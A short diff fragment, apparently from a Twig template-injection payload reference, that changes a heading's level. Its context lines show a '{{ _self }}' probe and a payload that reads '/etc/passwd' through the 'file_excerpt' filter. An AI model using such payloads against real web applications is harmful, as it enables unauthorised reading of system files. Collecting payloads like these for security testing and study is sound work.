@@ -85,7 +85,7 @@ Accept: */*
 {{ _self }}
 ```
 
-# LFI
+## LFI
 
 ```twig
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
